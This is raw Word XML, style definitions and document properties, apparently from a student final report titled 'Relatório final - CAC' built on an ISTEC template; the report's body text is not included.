      <w:szCs w:val="20"/>
      <w:lang w:val="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="InlineCode3">
    <w:name w:val="InlineCode.3"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:color w:val="C7254E"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="FencedCode">
    <w:name w:val="FencedCode"/>
    <w:pPr>
      <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:val="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="SourceText">
    <w:name w:val="Source Text"/>
    <w:rPr>
      <w:rFonts w:ascii="Noto Sans Mono" w:eastAsia="Noto Sans Mono" w:hAnsi="Noto Sans Mono" w:cs="FreeSans"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Forte">
    <w:name w:val="Strong"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="PreformattedText">
    <w:name w:val="Preformatted Text"/>
    <w:basedOn w:val="Normal"/>
    <w:pPr>
      <w:widowControl w:val="0"/>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Noto Sans Mono" w:eastAsia="Noto Sans Mono" w:hAnsi="Noto Sans Mono" w:cs="FreeSans"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="hi-IN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Commarcadores">
    <w:name w:val="Com marcadores"/>
    <w:basedOn w:val="Normal"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="1"/>
      </w:numPr>
      <w:suppressAutoHyphens w:val="0"/>
      <w:contextualSpacing/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsia="Times New Roman" w:hAnsi="Calibri"/>
      <w:lang w:val="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="SemEspaamento">
    <w:name w:val="No Spacing"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:lang w:eastAsia="pt-PT"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="SemEspaamentoChar">
    <w:name w:val="Sem Espaçamento Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsia="Times New Roman" w:hAnsi="Calibri" w:cs="Times New Roman"/>
      <w:lang w:eastAsia="pt-PT"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CabealhodoSumrio">
    <w:name w:val="Cabeçalho do Sumário"/>
    <w:basedOn w:val="Ttulo1"/>
    <w:next w:val="Normal"/>
    <w:pPr>
      <w:suppressAutoHyphens w:val="0"/>
      <w:spacing w:line="256" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri Light" w:hAnsi="Calibri Light"/>
      <w:color w:val="2F5496"/>
      <w:lang w:eastAsia="pt-PT"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Sumrio1">
    <w:name w:val="Sumário 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:pPr>
      <w:spacing w:after="100"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Sumrio2">
    <w:name w:val="Sumário 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="240"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Sumrio3">
    <w:name w:val="Sumário 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="480"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="PargrafodaLista">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Cabealhodondice">
    <w:name w:val="TOC Heading"/>
    <w:basedOn w:val="Ttulo1"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00363733"/>
    <w:pPr>
      <w:suppressAutoHyphens w:val="0"/>
      <w:autoSpaceDN/>
      <w:spacing w:line="259" w:lineRule="auto"/>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="0F4761" w:themeColor="accent1" w:themeShade="BF"/>
      <w:lang w:eastAsia="pt-PT"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ndice1">
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00363733"/>
    <w:pPr>
      <w:spacing w:after="100"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ndice2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00363733"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="240"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ndice3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00363733"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="480"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ndice4">
    <w:name w:val="toc 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00363733"/>
    <w:pPr>
      <w:suppressAutoHyphens w:val="0"/>
      <w:autoSpaceDN/>
      <w:spacing w:after="100" w:line="278" w:lineRule="auto"/>
      <w:ind w:left="720"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
      <w:kern w:val="2"/>
      <w:szCs w:val="24"/>
      <w:lang w:eastAsia="pt-PT"/>
      <w14:ligatures w14:val="standardContextual"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ndice5">
    <w:name w:val="toc 5"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00363733"/>
    <w:pPr>
      <w:suppressAutoHyphens w:val="0"/>
      <w:autoSpaceDN/>
      <w:spacing w:after="100" w:line="278" w:lineRule="auto"/>
      <w:ind w:left="960"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
      <w:kern w:val="2"/>
      <w:szCs w:val="24"/>
      <w:lang w:eastAsia="pt-PT"/>
      <w14:ligatures w14:val="standardContextual"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ndice6">
    <w:name w:val="toc 6"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00363733"/>
    <w:pPr>
      <w:suppressAutoHyphens w:val="0"/>
      <w:autoSpaceDN/>
      <w:spacing w:after="100" w:line="278" w:lineRule="auto"/>
      <w:ind w:left="1200"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
      <w:kern w:val="2"/>
      <w:szCs w:val="24"/>
      <w:lang w:eastAsia="pt-PT"/>
      <w14:ligatures w14:val="standardContextual"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ndice7">
    <w:name w:val="toc 7"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00363733"/>
    <w:pPr>
      <w:suppressAutoHyphens w:val="0"/>
      <w:autoSpaceDN/>
      <w:spacing w:after="100" w:line="278" w:lineRule="auto"/>
      <w:ind w:left="1440"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
      <w:kern w:val="2"/>
      <w:szCs w:val="24"/>
      <w:lang w:eastAsia="pt-PT"/>
      <w14:ligatures w14:val="standardContextual"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ndice8">
    <w:name w:val="toc 8"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00363733"/>
    <w:pPr>
      <w:suppressAutoHyphens w:val="0"/>
      <w:autoSpaceDN/>
      <w:spacing w:after="100" w:line="278" w:lineRule="auto"/>
      <w:ind w:left="1680"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
      <w:kern w:val="2"/>
      <w:szCs w:val="24"/>
      <w:lang w:eastAsia="pt-PT"/>
      <w14:ligatures w14:val="standardContextual"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ndice9">
    <w:name w:val="toc 9"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00363733"/>
    <w:pPr>
      <w:suppressAutoHyphens w:val="0"/>
      <w:autoSpaceDN/>
      <w:spacing w:after="100" w:line="278" w:lineRule="auto"/>
      <w:ind w:left="1920"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
      <w:kern w:val="2"/>
      <w:szCs w:val="24"/>
      <w:lang w:eastAsia="pt-PT"/>
      <w14:ligatures w14:val="standardContextual"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="MenoNoResolvida">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="Tipodeletrapredefinidodopargrafo"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00363733"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="nfaseDiscreta">
    <w:name w:val="Subtle Emphasis"/>
    <w:basedOn w:val="Tipodeletrapredefinidodopargrafo"/>
    <w:uiPriority w:val="19"/>
    <w:qFormat/>
    <w:rsid w:val="00236B3B"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
    </w:rPr>
  </w:style>
  <w:style w:type="numbering" w:customStyle="1" w:styleId="LFO29">
    <w:name w:val="LFO29"/>
    <w:basedOn w:val="Semlista"/>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rackstation.net"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seedsecuritylabs.org"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8.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ph\Downloads\Modelo%20ISTEC.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F1EAD-A505-47E9-8FC9-7D2EF245D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ISTEC.dotx</Template>
  <TotalTime>11</TotalTime>
  <Pages>91</Pages>
  <Words>14352</Words>
  <Characters>77503</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>645</Lines>
  <Paragraphs>183</Paragraphs>
  <ScaleCrop>false</ScaleCrop>
  <HeadingPairs>
    <vt:vector size="2" baseType="variant">
      <vt:variant>
        <vt:lpstr>Título</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="1" baseType="lpstr">
      <vt:lpstr>Relatório final - CAC</vt:lpstr>
    </vt:vector>
  </TitlesOfParts>
  <Company/>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>91672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 CAC</dc:title>
  <dc:subject/>
  <dc:creator>rodrigo baltazar, 2024142                                                                Rafael baptista, 2024xxx                                                                   José Couto, 2024xxx                                                                              Samuel Rocha, 2024xxx                                                                                Davide Ferreira,2024xxx</dc:creator>
  <dc:description/>
  <cp:lastModifiedBy>Joseph</cp:lastModifiedBy>
  <cp:revision>3</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-11-12T23:02:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-11-12T23:18:00Z</dcterms:modified>
</cp:coreProperties>
</file>